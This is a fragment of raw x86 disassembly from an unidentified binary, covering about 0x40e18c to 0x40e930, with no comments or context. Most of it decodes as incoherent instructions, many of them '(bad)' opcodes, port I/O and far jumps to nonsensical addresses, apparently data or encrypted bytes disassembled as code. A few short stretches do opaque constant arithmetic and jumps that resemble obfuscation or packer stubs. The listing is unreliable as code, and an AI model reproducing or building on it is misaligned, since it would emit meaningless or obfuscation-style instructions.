  40e18c:	sub    dh,ah
  40e18e:	mov    BYTE PTR [ecx],ah
  40e190:	inc    esi
  40e191:	pop    ds
  40e192:	and    dh,bl
  40e194:	leave  
  40e195:	out    0x4b,eax
  40e197:	jle    0x40e14d
  40e199:	popf   
  40e19a:	jns    0x40e218
  40e19c:	into   
  40e19d:	enter  0x1818,0xd2
  40e1a1:	adc    al,0x18
  40e1a3:	sbb    BYTE PTR [edi+0x51],cl
  40e1a6:	(bad)  
  40e1a7:	fsubrp st(6),st
  40e1a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1aa:	inc    edx
  40e1ab:	clc    
  40e1ac:	mov    ecx,0x262140c9
  40e1b1:	ja     0x40e14e
  40e1b3:	fisubr DWORD PTR [esi+0x16]
  40e1b6:	push   esp
  40e1b7:	xchg   ecx,eax
  40e1b8:	pushf  
  40e1b9:	xor    DWORD PTR [edi-0x59],esi
  40e1bc:	in     eax,0xae
  40e1be:	pop    ds
  40e1bf:	(bad)  
  40e1c0:	in     al,dx
  40e1c1:	adc    dl,bl
  40e1c3:	jno    0x40e1c3
  40e1c5:	repz sti 
  40e1c7:	lods   al,BYTE PTR ds:[esi]
  40e1c8:	jle    0x40e19c
  40e1ca:	retf   0x373c
  40e1cd:	add    BYTE PTR [ebp+esi*8+0x1b69e818],al
  40e1d4:	sbb    BYTE PTR [edx],0x6e
  40e1d7:	lds    eax,FWORD PTR [esi]
  40e1d9:	mov    edi,0xeb4369a5
  40e1de:	loope  0x40e1df
  40e1e0:	pop    ebx
  40e1e1:	inc    edi
  40e1e2:	ret    
  40e1e3:	add    eax,0x14b0a186
  40e1e8:	hlt    
  40e1e9:	sub    BYTE PTR [ecx],bh
  40e1eb:	adc    ebp,DWORD PTR [ecx+0x4bc00092]
  40e1f1:	push   ecx
  40e1f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1f3:	and    al,0xf9
  40e1f5:	imul   bp,WORD PTR [esi],0xff82
  40e1f9:	fst    QWORD PTR [ebx]
  40e1fb:	add    DWORD PTR [ebp+0x37f9169a],edi
  40e201:	(bad)  
  40e203:	rcl    DWORD PTR [ecx],1
  40e205:	or     BYTE PTR [eax],dh
  40e207:	cld    
  40e208:	scas   eax,DWORD PTR es:[edi]
  40e209:	inc    ebx
  40e20a:	xchg   esi,eax
  40e20b:	stos   BYTE PTR es:[edi],al
  40e20c:	lods   al,BYTE PTR ds:[esi]
  40e20d:	xchg   edi,eax
  40e20e:	mov    edx,0x2830c108
  40e213:	addr16 fs inc edi
  40e216:	mov    eax,0xc80691f3
  40e21b:	cmp    al,0xe
  40e21d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e21e:	add    al,0x6a
  40e220:	and    edi,DWORD PTR [ecx]
  40e222:	cmp    eax,0x590db501
  40e227:	add    eax,0x7e96cfd
  40e22c:	and    BYTE PTR [esi+0x2a],al
  40e22f:	push   es
  40e230:	push   edx
  40e231:	scas   al,BYTE PTR es:[edi]
  40e232:	and    DWORD PTR [edx],ebx
  40e234:	fidiv  DWORD PTR [ebp-0x13ceab1c]
  40e23a:	mov    edi,0xba92c1d0
  40e23f:	or     eax,0xb4df492d
  40e244:	pop    ss
  40e245:	ins    BYTE PTR es:[edi],dx
  40e246:	sbb    BYTE PTR [esi],ah
  40e248:	ret    0xca6a
  40e24b:	mov    bl,0x13
  40e24d:	mov    esi,0x21745306
  40e252:	lods   eax,DWORD PTR ds:[esi]
  40e253:	fcmovbe st,st(1)
  40e255:	dec    ebx
  40e256:	cs push edx
  40e258:	rcl    ch,cl
  40e25a:	mov    DWORD PTR ds:0x35220543,0xf14ffa87
  40e264:	ret    0x1c51
  40e267:	shr    BYTE PTR [edi],0x83
  40e26a:	pop    ss
  40e26b:	mov    eax,0x154f0348
  40e270:	sbb    al,0xe7
  40e272:	jg     0x40e26f
  40e274:	repnz adc al,0x37
  40e277:	adc    eax,0x71048a7c
  40e27c:	jo     0x40e28b
  40e27e:	inc    esi
  40e27f:	push   edx
  40e280:	mov    dh,0x71
  40e282:	xchg   ecx,eax
  40e283:	rcl    bh,cl
  40e285:	and    al,0xf0
  40e287:	cmp    DWORD PTR [ebp+0x61],0x204fb2da
  40e28e:	popa   
  40e28f:	sbb    ecx,edi
  40e291:	adc    cl,0xec
  40e294:	sbb    esi,DWORD PTR [eax]
  40e296:	pusha  
  40e297:	inc    esp
  40e298:	in     al,0xfc
  40e29a:	ret    
  40e29b:	mov    eax,ds:0x3f5d1eea
  40e2a0:	sar    BYTE PTR [ebp-0x7c],1
  40e2a3:	cs jge 0x40e295
  40e2a6:	xchg   ecx,eax
  40e2a7:	pop    esp
  40e2a8:	hlt    
  40e2a9:	mov    al,ds:0x9677333d
  40e2ae:	sbb    al,0xe2
  40e2b0:	xchg   ecx,eax
  40e2b1:	sub    eax,0x4e181d66
  40e2b6:	mov    ds:0x4bdbe5fb,eax
  40e2bb:	repz retf 0x50f9
  40e2bf:	jns    0x40e249
  40e2c1:	mov    es,WORD PTR [ebx-0x74]
  40e2c4:	repz or cl,ch
  40e2c7:	mov    edi,0xd76a9a51
  40e2cc:	mov    BYTE PTR [ebp-0x38c2d0c4],dl
  40e2d2:	js     0x40e2b1
  40e2d4:	repnz sub edx,eax
  40e2d7:	enter  0x3fab,0x24
  40e2db:	ror    DWORD PTR [ecx-0x34],0xf8
  40e2df:	pop    es
  40e2e0:	push   edi
  40e2e1:	ja     0x40e26a
  40e2e3:	xchg   ebp,eax
  40e2e4:	ss mov bl,0xc
  40e2e7:	frstor [esi]
  40e2e9:	test   ah,al
  40e2eb:	cmc    
  40e2ec:	out    0x51,al
  40e2ee:	retf   
  40e2ef:	mov    ds:0x2e114301,al
  40e2f4:	sahf   
  40e2f5:	add    bl,dh
  40e2f7:	sub    ch,BYTE PTR [edx]
  40e2f9:	jp     0x40e2eb
  40e2fb:	mov    BYTE PTR [edx-0x4f],bl
  40e2fe:	ror    DWORD PTR [eax],cl
  40e300:	sahf   
  40e301:	(bad)  
  40e302:	std    
  40e303:	test   cl,0xc3
  40e306:	mov    ebp,0xa5d4bf62
  40e30b:	pop    edx
  40e30c:	fcomp  QWORD PTR [esp+esi*2-0x61d20bf7]
  40e313:	sub    dh,BYTE PTR [ebx+0x38]
  40e316:	cmp    ch,BYTE PTR [eax]
  40e318:	repz add esi,ebx
  40e31b:	mov    edx,esi
  40e31d:	retf   
  40e31e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e31f:	sub    DWORD PTR [edx],0xffffffc2
  40e322:	pop    ds
  40e323:	inc    esp
  40e324:	(bad)  
  40e325:	into   
  40e326:	fwait
  40e327:	and    dh,BYTE PTR [ecx+0x49b1871d]
  40e32d:	inc    ecx
  40e32e:	mov    eax,0x3b529ca1
  40e333:	push   0xffffffe4
  40e335:	and    BYTE PTR [ecx+0x30607ab4],0x28
  40e33c:	jg     0x40e343
  40e33e:	push   ebp
  40e33f:	dec    edx
  40e340:	aas    
  40e341:	inc    esp
  40e342:	sti    
  40e343:	cmp    al,0x70
  40e345:	push   esp
  40e346:	xchg   edi,eax
  40e347:	pop    ebp
  40e348:	(bad)  
  40e349:	out    dx,al
  40e34a:	inc    esi
  40e34b:	fcom   DWORD PTR [ebx+0x12]
  40e34e:	repnz pop edx
  40e350:	mov    al,ds:0x566b8077
  40e355:	ret    0x2d1d
  40e358:	jl     0x40e37f
  40e35a:	imul   ebp,edx,0x20f1017e
  40e360:	(bad)
  40e363:	sbb    eax,0x1e3caa48
  40e368:	shr    DWORD PTR [ebx-0xb73e4d5],0xf4
  40e36f:	jb     0x40e389
  40e371:	int    0x4e
  40e373:	sbb    DWORD PTR [ebx-0x7929acbf],ebp
  40e379:	inc    ecx
  40e37a:	or     edx,DWORD PTR [ebx-0x50]
  40e37d:	and    DWORD PTR [ebx-0x8],eax
  40e380:	jne    0x40e3d1
  40e382:	dec    ebx
  40e383:	(bad)
  40e387:	sub    ecx,DWORD PTR [edi+0x78]
  40e38a:	(bad)  
  40e38b:	cmp    eax,0xa916be4
  40e390:	call   0x7fec557f
  40e395:	loop   0x40e379
  40e397:	aad    0xbb
  40e399:	shl    BYTE PTR [esi+0x77],1
  40e39c:	sbb    ch,ah
  40e39e:	dec    edi
  40e39f:	cmp    BYTE PTR [edi+0x6dc9bf43],ah
  40e3a5:	mov    cl,0x8e
  40e3a7:	and    bh,BYTE PTR [ecx+0x168761c6]
  40e3ad:	ins    BYTE PTR es:[edi],dx
  40e3ae:	cmp    eax,0x2a14377b
  40e3b3:	fisttp DWORD PTR [edi]
  40e3b5:	jnp    0x40e399
  40e3b7:	ret    
  40e3b8:	mov    dl,BYTE PTR [ebx]
  40e3ba:	ret    0xd709
  40e3bd:	sub    DWORD PTR ds:0x77d52edb,ecx
  40e3c3:	gs retf 0x8d35
  40e3c7:	lea    edi,[ebp+0x35e08250]
  40e3cd:	(bad)  [edi+0x6c]
  40e3d0:	mov    esi,0x2314a2ed
  40e3d5:	ret    0x876c
  40e3d8:	ins    DWORD PTR es:[edi],dx
  40e3d9:	and    BYTE PTR [edx-0x5b],0x12
  40e3dd:	nop
  40e3de:	inc    edi
  40e3df:	ret    
  40e3e0:	adc    ecx,DWORD PTR [ebx+0x2]
  40e3e3:	pop    eax
  40e3e4:	pop    edx
  40e3e5:	in     eax,0x3f
  40e3e7:	enter  0x2100,0x17
  40e3eb:	and    ch,dh
  40e3ed:	fcom   QWORD PTR [ebx]
  40e3ef:	call   0x36e0bd1
  40e3f4:	rol    ebx,1
  40e3f6:	scas   al,BYTE PTR es:[edi]
  40e3f7:	pop    ecx
  40e3f8:	nop
  40e3f9:	mov    ss,WORD PTR [edx]
  40e3fb:	xor    esp,DWORD PTR [eax+0x11b30e9f]
  40e401:	inc    esp
  40e402:	xchg   esi,eax
  40e403:	(bad)  
  40e404:	sub    ch,BYTE PTR [edi-0x56]
  40e407:	pop    ebp
  40e408:	fiadd  WORD PTR [eax]
  40e40a:	mov    eax,ds:0x1e55f8aa
  40e40f:	fwait
  40e410:	inc    esi
  40e411:	pop    ss
  40e412:	pop    ebx
  40e413:	jge    0x40e433
  40e415:	cmc    
  40e416:	add    BYTE PTR [ebp-0x3],dh
  40e419:	pushf  
  40e41a:	hlt    
  40e41b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e41c:	call   0xa449:0x327ca106
  40e423:	push   eax
  40e424:	mov    WORD PTR [ecx-0x54],fs
  40e427:	or     esp,DWORD PTR [esi+esi*2+0x55]
  40e42b:	test   al,0x50
  40e42d:	jmp    0x40e46d
  40e42f:	jno    0x40e3d0
  40e431:	mov    eax,0x1aa5b322
  40e436:	mov    dl,0xf2
  40e438:	cmp    al,0xce
  40e43a:	adc    DWORD PTR [edx+0xe],ebx
  40e43d:	adc    BYTE PTR [edx-0xf],dh
  40e440:	(bad)  ds:0x3fea02e8
  40e446:	das    
  40e447:	mov    cl,0x9e
  40e449:	div    DWORD PTR [esi+0x33]
  40e44c:	shl    BYTE PTR ds:0x6d33,cl
  40e452:	lea    ecx,[ecx+eax*1-0x6520]
  40e459:	mov    eax,DWORD PTR [ebp+0x8]
  40e45c:	mov    ebx,DWORD PTR [ebp-0x4]
  40e45f:	add    eax,edi
  40e461:	div    ebx
  40e463:	mov    edx,DWORD PTR [ebp-0x8]
  40e466:	mov    ebx,0x940a7
  40e46b:	sub    eax,edx
  40e46d:	xor    edx,edx
  40e46f:	div    ebx
  40e471:	add    eax,esi
  40e473:	cmp    ecx,eax
  40e475:	jb     0x40db77
  40e47b:	xor    ebx,ebx
  40e47d:	inc    ebx
  40e47e:	mov    DWORD PTR [ebp+0xc],0x77bd
  40e485:	mov    DWORD PTR [ebp+0x8],0x4f2a
  40e48c:	mov    DWORD PTR [ebp-0x8],0x4738
  40e493:	mov    DWORD PTR [ebp-0xc],0x6c4e
  40e49a:	mov    DWORD PTR [ebp-0x10],0x7f0d
  40e4a1:	mov    DWORD PTR [ebp-0x14],0x64ec
  40e4a8:	mov    DWORD PTR [ebp-0x18],0x1984
  40e4af:	mov    DWORD PTR [ebp-0x1c],0x293
  40e4b6:	mov    eax,DWORD PTR [ebp+0x8]
  40e4b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40e4bc:	add    eax,0x1ef2
  40e4c1:	and    eax,ecx
  40e4c3:	xor    eax,0x7240
  40e4c8:	mov    ecx,0x7aaa
  40e4cd:	jmp    0x40e791
  40e4d2:	mov    eax,0x5a62ef3c
  40e4d7:	and    bl,BYTE PTR [edx+edi*1]
  40e4da:	ss dec esi
  40e4dc:	xor    DWORD PTR [eax-0x4f821f2a],0x1818c289
  40e4e6:	rcl    BYTE PTR [eax+ebx*1],cl
  40e4e9:	sbb    cl,cl
  40e4eb:	inc    eax
  40e4ec:	mov    eax,ds:0x8dc91e2f
  40e4f1:	inc    edx
  40e4f2:	sub    eax,0x1d4bd90e
  40e4f7:	xchg   esp,eax
  40e4f8:	scas   eax,DWORD PTR es:[edi]
  40e4f9:	(bad)  
  40e4fa:	repnz pop ebx
  40e4fc:	in     eax,0x66
  40e4fe:	ins    DWORD PTR es:[edi],dx
  40e4ff:	add    bl,BYTE PTR [ecx+0x63d6c5a8]
  40e505:	adc    al,0xe9
  40e507:	push   0x6054089b
  40e50c:	dec    esp
  40e50d:	mov    cl,0xcd
  40e50f:	mov    al,0x8a
  40e511:	push   es
  40e512:	stos   BYTE PTR es:[edi],al
  40e513:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e514:	jne    0x40e4eb
  40e516:	mov    edx,0xc5684df
  40e51b:	mov    eax,ds:0xc81922e1
  40e520:	inc    ebp
  40e521:	sahf   
  40e522:	test   eax,0x81f21b55
  40e527:	in     eax,dx
  40e528:	daa    
  40e529:	mov    al,0x37
  40e52b:	mov    BYTE PTR [edx-0x6c],dh
  40e52e:	das    
  40e52f:	into   
  40e530:	sub    ebx,DWORD PTR [eax-0x47]
  40e533:	shl    dl,0xdf
  40e536:	ret    0x1954
  40e539:	(bad)  
  40e53b:	dec    edx
  40e53c:	mov    edx,0xf1e60e33
  40e541:	fild   QWORD PTR [ecx+0x7e86bac7]
  40e547:	dec    ebp
  40e548:	mov    bh,0x33
  40e54a:	test   al,0xad
  40e54c:	add    eax,0xae801907
  40e551:	mov    al,0x95
  40e553:	mov    ch,0x4c
  40e555:	mov    dh,0xcf
  40e557:	call   0x2e7ad98b
  40e55c:	ret    0x4a25
  40e55f:	jae    0x40e5d1
  40e561:	sbb    eax,DWORD PTR [esi-0xcbd77e0]
  40e567:	jge    0x40e5aa
  40e569:	int3   
  40e56a:	mov    ch,0x6e
  40e56c:	add    dh,BYTE PTR [edx+eax*4]
  40e56f:	sub    al,0x5f
  40e571:	inc    esp
  40e572:	stos   DWORD PTR es:[edi],eax
  40e573:	inc    ecx
  40e574:	ja     0x40e56e
  40e576:	xor    edi,eax
  40e578:	lock pop esp
  40e57a:	pushf  
  40e57b:	loop   0x40e54a
  40e57d:	in     al,dx
  40e57e:	or     DWORD PTR [eax+0x11],esp
  40e581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e582:	in     eax,dx
  40e583:	push   eax
  40e584:	das    
  40e585:	stos   DWORD PTR es:[edi],eax
  40e586:	xchg   edi,eax
  40e587:	ins    DWORD PTR es:[edi],dx
  40e588:	pop    esi
  40e589:	mov    ebx,0x965e15c8
  40e58e:	aam    0x41
  40e590:	adc    ebx,DWORD PTR [ebx-0x13bc22e0]
  40e596:	jb     0x40e586
  40e598:	sbb    DWORD PTR [eax+0x6e],edx
  40e59b:	mov    cl,0xf0
  40e59e:	jne    0x40e5fc
  40e5a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5a1:	fcomp  DWORD PTR [esp+ebx*4+0x4c]
  40e5a5:	mov    ah,0x6e
  40e5a7:	xor    esi,DWORD PTR [ebx]
  40e5a9:	push   ss
  40e5aa:	cld    
  40e5ab:	rol    BYTE PTR [esi],0x5a
  40e5ae:	dec    ebp
  40e5af:	jbe    0x40e570
  40e5b1:	jmp    0x63f6:0x26b2d24c
  40e5b8:	push   es
  40e5b9:	or     al,0xc
  40e5bb:	fidiv  DWORD PTR [ebp+0x6d]
  40e5be:	retf   0x15d0
  40e5c1:	adc    al,0x4e
  40e5c3:	cmp    ebp,edx
  40e5c5:	(bad)  
  40e5c6:	rol    DWORD PTR [edi+eax*1],1
  40e5c9:	mov    al,ds:0xb9b08d4e
  40e5ce:	imul   ecx,DWORD PTR [ebp-0x5fed52a8],0xffffffa5
  40e5d5:	test   al,0xbe
  40e5d7:	mov    bh,0xc3
  40e5d9:	jo     0x40e55e
  40e5db:	xchg   ebx,eax
  40e5dc:	jge    0x40e5fe
  40e5de:	test   eax,0x7c68fb79
  40e5e3:	cmp    BYTE PTR [ebx-0x5d8f119b],0xb0
  40e5ea:	ficomp DWORD PTR [ecx-0x9]
  40e5ed:	dec    ebp
  40e5ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5ef:	hlt    
  40e5f0:	mov    eax,ds:0x76a5bc6
  40e5f5:	or     ecx,DWORD PTR [eax+0x27]
  40e5f8:	mov    edi,0x9ac28c02
  40e5fd:	sbb    ecx,ebp
  40e5ff:	div    esp
  40e601:	jne    0x40e665
  40e603:	dec    edi
  40e604:	test   eax,0xaf36997f
  40e609:	test   DWORD PTR [ebx-0x6852f70a],ebp
  40e60f:	(bad)  
  40e611:	jecxz  0x40e5f6
  40e613:	shl    DWORD PTR es:[eax+0x690657f8],0xd3
  40e61b:	bnd je 0x40e657
  40e61e:	pop    ss
  40e61f:	mov    edx,0x60406df1
  40e624:	xor    DWORD PTR [ecx],ecx
  40e626:	cmp    eax,0x968489bc
  40e62b:	in     eax,dx
  40e62c:	push   0x3f6b67e5
  40e631:	sar    DWORD PTR [edi-0x26],1
  40e634:	pop    ds
  40e635:	jle    0x40e675
  40e637:	pop    eax
  40e638:	adc    eax,0xe0d22499
  40e63d:	inc    edx
  40e63e:	ins    DWORD PTR es:[edi],dx
  40e63f:	mul    BYTE PTR [ebp+0x8]
  40e642:	and    al,0x6c
  40e644:	clc    
  40e645:	jle    0x40e64b
  40e647:	fcomp  st(1)
  40e649:	or     DWORD PTR [ecx-0x2c3608f0],0x5b
  40e650:	or     al,0x35
  40e652:	sub    al,0x89
  40e654:	outs   dx,DWORD PTR ds:[esi]
  40e655:	das    
  40e656:	ins    DWORD PTR es:[edi],dx
  40e657:	inc    eax
  40e658:	mov    ah,0x96
  40e65a:	mov    al,0xf
  40e65c:	jo     0x40e5eb
  40e65e:	cmp    al,0x4d
  40e660:	xor    cl,BYTE PTR [edi+0x54032d2e]
  40e666:	scas   eax,DWORD PTR es:[edi]
  40e667:	push   ebx
  40e668:	jno    0x40e5fb
  40e66a:	popf   
  40e66b:	(bad)  
  40e66c:	ins    BYTE PTR es:[edi],dx
  40e66d:	(bad)  
  40e66e:	(bad)  
  40e670:	ja     0x40e62e
  40e672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e673:	les    eax,FWORD PTR [ebx]
  40e675:	push   ecx
  40e676:	test   eax,0xc98f9899
  40e67b:	mov    eax,ds:0x484b03e4
  40e680:	lods   eax,DWORD PTR ds:[esi]
  40e681:	xor    DWORD PTR [edx+0x7b],esp
  40e684:	push   cs
  40e685:	ins    DWORD PTR es:[edi],dx
  40e686:	loopne 0x40e6b9
  40e688:	mov    fs,WORD PTR [ecx-0x7a9c0f83]
  40e68e:	out    0x39,al
  40e690:	int    0xac
  40e692:	loop   0x40e69a
  40e694:	jmp    0x3de2:0xd429fc00
  40e69b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e69c:	cmp    DWORD PTR [eax],edx
  40e69e:	xchg   ch,ah
  40e6a0:	popf   
  40e6a1:	xor    BYTE PTR [ecx],0xd9
  40e6a4:	push   0x59
  40e6a6:	add    al,BYTE PTR [esi+0xe]
  40e6a9:	push   esi
  40e6aa:	test   al,0x8d
  40e6ac:	arpl   WORD PTR [eax-0x32c9893c],sp
  40e6b2:	inc    esi
  40e6b3:	(bad)  
  40e6b4:	jl     0x40e6cd
  40e6b6:	inc    ebx
  40e6b7:	test   eax,0xb2d6bd66
  40e6bc:	ret    0xafd3
  40e6bf:	ficom  WORD PTR [edx+0x7a951fd4]
  40e6c5:	inc    ecx
  40e6c6:	(bad)  
  40e6c7:	sete   BYTE PTR [ebp+edi*1-0x79de03c5]
  40e6cf:	call   0x1de5:0xdcfa4c45
  40e6d6:	fstp   DWORD PTR ds:0xb6aeb298
  40e6dc:	aam    0x2b
  40e6de:	loope  0x40e6be
  40e6e0:	and    dl,BYTE PTR ds:0x9c272d88
  40e6e6:	in     al,0x75
  40e6e8:	xchg   BYTE PTR [edx+edi*8],bl
  40e6eb:	mov    ebp,0x3d412be8
  40e6f0:	dec    edi
  40e6f1:	lods   al,BYTE PTR ds:[esi]
  40e6f2:	int    0x6b
  40e6f4:	inc    esi
  40e6f5:	inc    esp
  40e6f6:	add    bh,BYTE PTR [ecx-0x10]
  40e6f9:	mov    ecx,es
  40e6fb:	aaa    
  40e6fc:	(bad)  
  40e6fe:	psrld  mm4,QWORD PTR ds:0xe2a5e02c
  40e705:	dec    esp
  40e706:	push   es
  40e707:	fst    st(6)
  40e709:	je     0x40e6ab
  40e70b:	test   BYTE PTR [edi],ah
  40e70d:	lea    edi,[ecx]
  40e70f:	adc    BYTE PTR [ecx],ah
  40e711:	jl     0x40e6dc
  40e713:	out    dx,eax
  40e714:	gs xor edi,edx
  40e717:	mov    cl,0xd9
  40e719:	rcl    edi,1
  40e71b:	ret    
  40e71c:	into   
  40e71d:	xor    cl,al
  40e71f:	cmp    al,0x8a
  40e721:	jecxz  0x40e6d4
  40e723:	out    dx,eax
  40e724:	and    al,0x41
  40e726:	mov    esi,DWORD PTR [ebx]
  40e728:	xchg   ebx,eax
  40e729:	jne    0x40e6f7
  40e72b:	sub    dl,BYTE PTR [edx-0x77726656]
  40e731:	xchg   bx,ax
  40e733:	jnp    0x40e78c
  40e735:	xor    BYTE PTR [edx-0x4858696d],dl
  40e73b:	inc    eax
  40e73c:	sub    edi,DWORD PTR [ebx]
  40e73e:	adc    ah,dh
  40e740:	xor    ch,BYTE PTR [esi]
  40e742:	dec    edx
  40e743:	aaa    
  40e744:	cmp    edi,edi
  40e746:	sar    ebx,0xcf
  40e749:	mov    si,0xc2a1
  40e74d:	jmp    0x8010cecb
  40e752:	sbb    eax,0xd8d3def6
  40e757:	fucomip st,st(6)
  40e759:	aaa    
  40e75a:	mov    DWORD PTR [ecx-0x7e],esi
  40e75d:	pop    esi
  40e75e:	dec    edx
  40e75f:	into   
  40e760:	push   ss
  40e761:	sub    DWORD PTR [esi+0x43e95680],ebx
  40e767:	ds cmp al,0xa3
  40e76a:	inc    ebx
  40e76b:	xor    ch,dh
  40e76d:	lahf   
  40e76e:	mov    eax,0x339c059a
  40e773:	aam    0x60
  40e775:	mov    bh,0x24
  40e777:	out    0x5e,eax
  40e779:	daa    
  40e77a:	cwde   
  40e77b:	jae    0x40e7af
  40e77d:	jmp    0x40e733
  40e77f:	lods   eax,DWORD PTR ds:[esi]
  40e780:	dec    ecx
  40e781:	adc    DWORD PTR [ebx+0x53de1574],esp
  40e787:	mov    al,0xfa
  40e789:	lea    esi,[esi]
  40e78b:	imul   ebx,DWORD PTR [edi-0xb6e5f74],0x2b
  40e792:	enter  0x45c7,0xc
  40e796:	ror    DWORD PTR [eax],cl
  40e798:	add    BYTE PTR [eax],al
  40e79a:	mov    DWORD PTR [ebp+0x8],0x2392
  40e7a1:	mov    DWORD PTR [ebp-0x20],ebx
  40e7a4:	mov    DWORD PTR [ebp-0x24],0x338f
  40e7ab:	mov    DWORD PTR [ebp-0x28],0x61c9
  40e7b2:	mov    eax,DWORD PTR [ebp+0x8]
  40e7b5:	mov    edx,DWORD PTR [ebp+0xc]
  40e7b8:	imul   eax,edx
  40e7bb:	xor    eax,0x40a0
  40e7c0:	or     eax,0x1a48
  40e7c5:	xor    eax,0x139ddb0
  40e7ca:	mov    esi,ecx
  40e7cc:	sub    esi,eax
  40e7ce:	mov    eax,DWORD PTR [ebp-0x28]
  40e7d1:	mov    edx,DWORD PTR [ebp-0x24]
  40e7d4:	mov    edi,DWORD PTR [ebp-0x20]
  40e7d7:	or     eax,0x1cc2
  40e7dc:	sub    eax,edx
  40e7de:	jmp    0x40eaa2
  40e7e3:	or     BYTE PTR [esp+ebx*1-0xd],0x1c
  40e7e8:	loop   0x40e828
  40e7ea:	sbb    bh,BYTE PTR [esi]
  40e7ec:	call   DWORD PTR [ebx-0x56]
  40e7ef:	fwait
  40e7f0:	mov    ?,WORD PTR [ebp+0x7c]
  40e7f3:	inc    edx
  40e7f4:	mov    esi,0x14d21818
  40e7f9:	sbb    BYTE PTR [eax],bl
  40e7fb:	ja     0x40e802
  40e7fd:	jg     0x40e7dd
  40e7ff:	xor    bl,BYTE PTR ds:0xfd6ddcb8
  40e805:	mov    WORD PTR [esi+0x3],es
  40e808:	and    esi,DWORD PTR [eax]
  40e80a:	dec    ebp
  40e80b:	sub    DWORD PTR [ebx],edi
  40e80d:	mov    DWORD PTR [esp+ecx*8-0x74646e92],edx
  40e814:	dec    esi
  40e815:	inc    esi
  40e816:	mov    WORD PTR [edi+0x588b5f42],gs
  40e81c:	mov    ds:0xc4fc7c3d,al
  40e821:	pop    edx
  40e822:	cmp    al,bl
  40e824:	xchg   ecx,eax
  40e825:	xor    al,0xff
  40e827:	mov    eax,ds:0x6ee3499b
  40e82c:	(bad)  [ebp+0x3a]
  40e82f:	enter  0x69e5,0x73
  40e833:	pop    ds
  40e834:	into   
  40e835:	leave  
  40e836:	jmp    0x6e54:0x7a4c902d
  40e83d:	test   DWORD PTR [edx-0x7c985d40],esi
  40e843:	fisttp WORD PTR [edi+0x51347e96]
  40e849:	or     DWORD PTR [esi-0x1d],ecx
  40e84c:	std    
  40e84d:	add    BYTE PTR [ebx-0x24],0xfa
  40e851:	inc    edx
  40e853:	(bad)  [ebx]
  40e855:	xchg   ebx,eax
  40e856:	fbld   TBYTE PTR [edi+0x35]
  40e859:	ins    DWORD PTR es:[edi],dx
  40e85a:	mov    cl,0x80
  40e85c:	cmp    eax,0x9409caf1
  40e861:	xchg   ebp,eax
  40e862:	ror    DWORD PTR [ecx+0x32],cl
  40e865:	mov    bl,ah
  40e867:	jmp    0xc695:0x4435fe88
  40e86e:	push   ds
  40e86f:	jnp    0x40e855
  40e871:	xchg   esi,eax
  40e872:	or     eax,0xad8b235f
  40e877:	add    BYTE PTR [esi],al
  40e879:	mov    esi,0x3f6ab254
  40e87e:	(bad)  
  40e87f:	xor    ah,BYTE PTR [ebx+ebx*1]
  40e882:	rol    ecx,0xcf
  40e885:	out    0x5d,al
  40e887:	cld    
  40e888:	add    DWORD PTR [eax],edx
  40e88a:	xor    al,0x9d
  40e88c:	xchg   sp,ax
  40e88e:	hlt    
  40e88f:	loop   0x40e88b
  40e891:	inc    ebp
  40e892:	sbb    esp,edi
  40e894:	ja     0x40e842
  40e896:	cmp    ah,BYTE PTR [esi+0x69]
  40e899:	and    esp,ecx
  40e89b:	cs mov bl,0x5d
  40e89e:	aaa    
  40e89f:	mov    dh,0xd8
  40e8a1:	sub    BYTE PTR [ebx+0x52],dl
  40e8a4:	gs or  al,0xed
  40e8a7:	dec    eax
  40e8a8:	lea    eax,[ebx-0x1b]
  40e8ab:	sub    edx,DWORD PTR [esi+ecx*1]
  40e8ae:	sar    BYTE PTR [edx+0x1e3bede6],1
  40e8b4:	ds jno 0x40e8f0
  40e8b7:	xchg   ebp,eax
  40e8b8:	dec    eax
  40e8b9:	sahf   
  40e8ba:	jmp    0xbfd709d1
  40e8bf:	sti    
  40e8c0:	shr    BYTE PTR [eax],1
  40e8c2:	lock fcom st(1)
  40e8c5:	test   eax,0x2c3cc9a3
  40e8ca:	mov    dh,0x82
  40e8cc:	nop
  40e8cd:	stos   DWORD PTR es:[edi],eax
  40e8ce:	dec    esi
  40e8cf:	push   cs
  40e8d0:	jmp    0x40e8c3
  40e8d2:	and    BYTE PTR [ebp+0x540ce1b9],al
  40e8d8:	cmc    
  40e8d9:	out    dx,eax
  40e8da:	enter  0xfb7d,0xad
  40e8de:	ja     0x40e872
  40e8e0:	shl    BYTE PTR [ebx],1
  40e8e2:	xor    BYTE PTR [edx+0x1a],0x10
  40e8e6:	add    eax,0x648cb8c3
  40e8eb:	iret   
  40e8ec:	enter  0x7f5,0xe8
  40e8f0:	xchg   esi,eax
  40e8f1:	enter  0xed42,0x6e
  40e8f5:	adc    bh,BYTE PTR [esi+0x69]
  40e8f8:	xchg   edi,eax
  40e8f9:	cdq    
  40e8fa:	scas   al,BYTE PTR es:[edi]
  40e8fb:	(bad)  [ecx]
  40e8fd:	xor    bh,BYTE PTR ds:[eax-0x3e23d6f7]
  40e904:	ins    BYTE PTR es:[edi],dx
  40e905:	xlat   BYTE PTR ds:[ebx]
  40e906:	jle    0x40e8cf
  40e908:	cli    
  40e909:	jecxz  0x40e8b1
  40e90b:	cmp    al,0xe2
  40e90d:	hlt    
  40e90e:	(bad)  
  40e910:	dec    ebp
  40e911:	pop    ecx
  40e912:	(bad)  
  40e914:	jl     0x40e8e7
  40e916:	jg     0x40e8a3
  40e918:	add    ecx,ecx
  40e91a:	ja     0x40e939
  40e91c:	push   ecx
  40e91d:	cld    
  40e91e:	inc    ebp
  40e91f:	sbb    eax,0x518867f4
  40e924:	add    al,0x78
  40e926:	mov    ah,0x50
  40e928:	neg    DWORD PTR ds:0xd2f703e4
  40e92e:	sub    ebp,edx
  40e930:	push   cs
